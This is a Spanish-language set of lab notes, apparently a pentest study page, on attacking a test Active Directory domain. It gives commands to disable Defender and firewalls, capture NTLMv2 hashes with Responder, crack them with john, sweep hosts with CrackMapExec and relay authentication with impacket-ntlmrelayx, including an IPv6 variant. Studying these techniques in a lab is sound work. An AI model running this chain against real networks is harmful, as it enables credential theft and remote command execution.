---
title: Active Directory Overview
id: ad-overview
---

https://www.youtube.com/watch?v=-bNb4hwgkCo&t=1814s

## Configuración del entorno

> Lab local con credenciales de prueba — no usar en producción.

| Máquina | IP | Dominio | Rol |
|---|---|---|---|
| DC-Evilcorp | 192.168.15.145 | evilcorp.local | Domain Controller |
| PC-fmol | 192.168.15.150 | evilcorp.local | Workstation |
| PC-pobre | 192.168.15.151 | evilcorp.local | Workstation |
| Kali | 192.168.15.131 | — | Atacante |

```powershell
Uninstall-WindowsFeature -name Windows-Defender
```

Desactivar el cortafuegos en todos los equipos Windows.

## Smb-relay

`cd /usr/share/responder`
`nano Responder.conf`

```bash
sudo python3 Responder.py -I eth0 -wd
```

![](./img/enter-net-creds.png)

![](./img/captured-hashes.png)

Estos hashes no nos servirian para hacer *pass the hash* pero si podriamos intentar crackearlos.

```bash
nano hashes
# Pegar hashes NTLMv2 capturados (formato: usuario::DOMINIO:challenge:response)
# Ejemplo:
# user::DOMAIN:challenge:NTLMv2_response
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
```


## CrackMapExec

Desactivamos el cortafuegos y el antivirus en todos los equipos Windows.

```bash
crackmapexec smb 192.168.15.0/24
```

![](./img/crackmapexec-smb-example.png)


## NTLM-relay: usuario de dominio y administrador local

![](./img/windows-users.png)

```bash
crackmapexec smb 192.168.15.0/24 -u 'pobre' -p 'P0bre$22'
```

![](./img/crackmapexec-smb-example-2.png)


```bash
sudo nmap --script=smb2-security-mode -p445 192.168.15.151

Starting Nmap 7.94 ( https://nmap.org ) at 2024-08-02 00:29 EDT
Nmap scan report for 192.168.15.151
Host is up (0.00028s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:F2:C7:EC (VMware)

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
```

Con un usuario de dominio como administrador local *(Pwn3d!)* podemos hacer varias cosas como, por ejemplo, dumpear la SAM.

```bash
nano Responder.conf
.............
SMB = Off
.............
HTTP = Off
.............
```

```bash
sudo python3 Responder.py -I eth0 -wd
```

```bash
nano targets.txt
192.168.15.151
```

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
```

https://warroom.rsmus.com/how-to-perform-ntlm-relay/
https://hackmd.io/@Mecanico/r1Tjh851c
https://www.thehacker.recipes/a-d/movement/ntlm/relay
https://trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022


```bash
sudo python3 Responder.py -I eth0 -wd
```


```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -c "command"
```


## NTLM-relay ipv6

```bash
sudo mimt6 -d evilcorp.local
```

```bash
impacket-ntlmrelayx -wh 192.168.15.131 -t smb://192.168.15.151 -smb2support -socks -debug 
```

